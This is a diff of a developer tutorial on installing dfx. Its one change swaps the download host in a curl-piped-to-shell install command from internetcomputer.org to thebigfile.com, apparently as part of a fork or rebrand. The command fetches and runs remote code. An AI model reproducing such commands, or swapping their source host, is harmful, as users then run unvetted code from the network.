@@ -76,7 +76,7 @@ An alternative implementation for Motoko can be found [here](https://github.com/
 To start, let's set up our development environment. Make sure you have [dfx](/docs/current/developer-docs/getting-started/install/) installed on your computer. You will need at least version 0.15.0 of dfx for composite query support. Open your terminal and follow these commands:
 
 ```bash
-DFX_VERSION=0.15.0-beta.1 sh -ci "$(curl -fsSL https://internetcomputer.org/install.sh)"
+DFX_VERSION=0.15.0-beta.1 sh -ci "$(curl -fsSL https://thebigfile.com/install.sh)"
 ```
 
 Then clone the ICP sample apps as follows:
